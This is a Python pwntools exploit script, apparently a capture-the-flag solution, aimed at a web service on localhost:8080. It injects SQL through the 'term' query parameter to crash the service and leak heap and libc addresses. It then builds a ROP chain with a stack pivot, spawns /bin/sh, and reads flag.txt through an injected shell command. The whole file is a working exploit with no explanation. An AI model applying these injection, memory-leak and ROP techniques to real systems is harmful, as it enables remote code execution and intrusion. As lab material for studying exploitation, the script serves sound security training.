import codecs
import re
from random import randint

from pwn import *
from requests import get

context.arch = 'amd64'

host = 'http://localhost:8080'

def inject(cmd):
    cmd = b"' limit 0;" + cmd + b"--"
    return get(host, params={'term': cmd})

def crash():
    inject(b"select 0,title-1,0 from title limit 1;")

# Have python restart us for repeatability
crash()

def leak(off):
    leak_cmd = f"select 0,'{'x'*0x48}'+tconst-tconst+({off:10}),0 from title limit 1;".encode()
    bs = inject(leak_cmd).content
    link_str = b'<a href="/film/0">'
    bs = bs[bs.find(link_str)+len(link_str):]
    bs = bs[:bs.find(b'</a>')]
    return codecs.escape_decode(bs)[0]

# We reach a "steady state" for a few iterations after 8 calls
# Must be a fresh process
for i in range(8):
    print('leak', i)
    leak(0)
bs = leak(-0x3fe0)
print('cmd_buf leak:')
print(hexdump(bs))              # pointer to cmd_buf in flex heap struct
cmd_buf = u64(bs[0:8])
print(f'cmd_buf: {cmd_buf:016x}')

bs = leak(0x060)                # main_arena+96
print('libc leak:')
print(hexdump(bs))
libc = u64(bs[0:8]) - 0x219ce0
print(f'libc: {libc:016x}')

chain_offset = 0x300
chain_addr = cmd_buf + chain_offset

gadgets = [
    libc + 0x90528,             # pop rax ; pop rdx ; pop rbx ; ret
    chain_addr,                 # stack pivot
    libc + 0x5a170              # mov rsp, rdx ; ret
]

# Make a fresh table
table = f"foo_{randint(0, 10000):05}"
cols = ', '.join(f'x{i} integer' for i, _ in enumerate(gadgets))
inject(f"create table {table}({cols}, primary key (x0));".encode())

# Need 30 multiplications beforre proj to fill registers.
lo_addrs = ','.join(str(g & 0xffffffff) for g in gadgets)
hi_addrs = []
for g in gadgets:
    lo = g & 0xffffffff
    if lo & (1 << 31):
        lo = lo | 0xffffffff00000000
    hi_addrs.append((g - lo) & 0xffffffffffffffff)
insert_lo = f"insert into {table} values ({lo_addrs});".encode()
load_hi = '*'.join(str(hi) for hi in hi_addrs)
fill_regs = '*'.join(str(x) for x in range(len(gadgets), 31))
proj_regs = '*'.join(f'(x{i}+{hi})' for i, hi in enumerate(hi_addrs))
rop_trigger = f"select {load_hi}*{fill_regs}*{proj_regs} from {table};".encode()
inject_prefix = b"select tconst, title, year from title        where title like '%' limit 0;"

assert len(inject_prefix) + len(rop_trigger) <= chain_offset
rop_trigger = rop_trigger.ljust(chain_offset - len(inject_prefix))

chain = [
    libc + 0xf9e46,             # pop rcx ; xor eax, eax ; pop rbp ; ret
    0, 0,
    # posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
    # constraints:
    #   rsp & 0xf == 0
    #   rcx == NULL
    #   rbp == NULL || (u16)[rbp] == NULL
    libc + 0x50a37,
]
rop_trigger += flat(chain)

inject(insert_lo)
print('rop:')
for g in gadgets:
    print(f'  {g:016x}')
print('rop (stage 2):')
for g in chain:
    print(f'  {g:016x}')
print('rop_trigger:')
print(hexdump(rop_trigger))
inject(rop_trigger)

result = get(host, params={'term': b"'; cat flag.txt;\n"}).text
sh_chars = re.findall('<a href="/film/db returned other:">(.)', result)
print(''.join(c[0] for c in sh_chars))
